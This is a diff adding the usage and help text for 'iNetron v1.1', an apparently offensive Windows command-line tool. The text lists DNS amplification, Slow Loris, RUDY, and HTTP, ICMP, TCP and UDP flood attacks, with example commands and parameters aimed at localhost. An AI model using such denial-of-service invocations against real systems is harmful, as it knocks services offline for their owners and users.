@@ -1,0 +1,49 @@
+iNetron v1.1 (C) mrvodka
+
+Usage:  [attack-type] [...]
+
+For help, use switch /?
+
+Types:
+	/dns	DNS Amplification Attack (Requires WinPcap)
+	
+	/loris	Slow Loris HTTP Attack
+	/srudy	Simplified Rudy HTTP Attack
+
+	/http	HTTP Flood Attack
+	/icmp	ICMP (Ping) Flood Attack
+	/tcp 	TCP Flood Attack
+	/udp 	UDP Flood Attack
+
+DNS Usage: [target-ip] [dns-ip] [ipv6] [optional:domain]
+Example:
+	iNetron.CLI.exe /dns 127.0.0.1 10.0.0.1 no google.com
+	iNetron.CLI.exe /dns ::1 ::1 yes
+
+LORIS Usage: [target-ip] [https] [port] [sockets] [user-agent]
+Example:
+	iNetron.CLI.exe /loris 127.0.0.1 yes 443 200 Mozilla/WinNT6.1-Like:Gecko\Safari1.1
+	iNetron.CLI.exe /loris 127.0.0.1 no 80 1000 iPhone
+
+SRUDY Usage: [target-ip] [https] [port] [sockets] [user-agent]
+Example:
+	iNetron.CLI.exe /srudy 127.0.0.1 yes 443 500 iPhone
+	iNetron.CLI.exe /srudy 127.0.0.1 no 80 10 Gecko\Safari1.1
+
+HTTP Usage: [target-ip] [https] [port] [sockets] [user-agent]
+Example:
+	iNetron.CLI.exe /http 127.0.0.1 yes 443 200 Mozilla/WinNT6.1-Like:Gecko\Safari1.1
+	iNetron.CLI.exe /http 127.0.0.1 no 80 100 iPhone
+
+ICMP Usage: [target-ip] [size] [threads]
+Example:
+	iNetron.CLI.exe /icmp 127.0.0.1 64 32
+
+TCP Usage: [target-ip] [port] [size] [threads]
+Example:
+	iNetron.CLI.exe /tcp 127.0.0.1 123 128 64
+
+UDP Usage: [target-ip] [port] [size] [threads]
+Example:
+	iNetron.CLI.exe /udp 127.0.0.1 123 128 64
+
